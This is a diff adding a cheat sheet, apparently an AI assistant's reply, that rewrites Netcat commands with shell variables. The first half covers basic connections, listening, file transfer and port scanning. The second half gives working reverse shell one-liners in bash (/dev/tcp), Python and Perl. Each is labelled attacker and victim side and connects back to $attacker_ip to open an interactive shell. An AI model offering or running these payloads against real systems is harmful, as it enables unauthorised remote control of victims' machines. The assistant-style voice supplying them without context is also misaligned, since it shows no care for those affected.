@@ -1,0 +1,44 @@
+Sure, you can replace placeholders like `<example>` with shell variables for improved readability and flexibility. Here's the Netcat (nc) and reverse shell commands with shell variables:
+
+**Netcat (nc) with Shell Variables:**
+
+1. **Basic Netcat Connection:**
+   - Command: `nc $target $port`
+   - Explanation: Create a basic Netcat connection to a target on a specified port.
+
+2. **Listening for Connections:**
+   - Command: `nc -l -p $port`
+   - Explanation: Set up Netcat to listen on a specific port for incoming connections.
+
+3. **File Transfer from Server to Client:**
+   - Command (Server Side): `nc -l -p $port < $file_to_send`
+   - Command (Client Side): `nc $server_ip $port > $received_file`
+   - Explanation: Transfer a file from the server to the client.
+
+4. **File Transfer from Client to Server:**
+   - Command (Server Side): `nc -l -p $port > $received_file`
+   - Command (Client Side): `nc $server_ip $port < $file_to_send`
+   - Explanation: Transfer a file from the client to the server.
+
+5. **Port Scanning with Netcat:**
+   - Command: `nc -v -z $target $start_port-$end_port`
+   - Explanation: Perform a simple port scan to check if ports are open or closed.
+
+**Reverse Shell with Shell Variables:**
+
+1. **Bash Reverse Shell:**
+   - Command (Attacker Side): `nc -l -p $port`
+   - Command (Victim Side): `/bin/bash -i > /dev/tcp/$attacker_ip/$port 0<&1 2>&1`
+   - Explanation: Execute a reverse shell from the victim to the attacker.
+
+2. **Python Reverse Shell:**
+   - Command (Attacker Side): `nc -l -p $port`
+   - Command (Victim Side): `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$attacker_ip",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'`
+   - Explanation: Execute a Python reverse shell from the victim to the attacker.
+
+3. **Perl Reverse Shell:**
+   - Command (Attacker Side): `nc -l -p $port`
+   - Command (Victim Side): `perl -e 'use Socket;$i="$attacker_ip";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+   - Explanation: Execute a Perl reverse shell from the victim to the attacker.
+
+By using shell variables, you can easily customize and reuse these commands with different values for your specific scenarios.
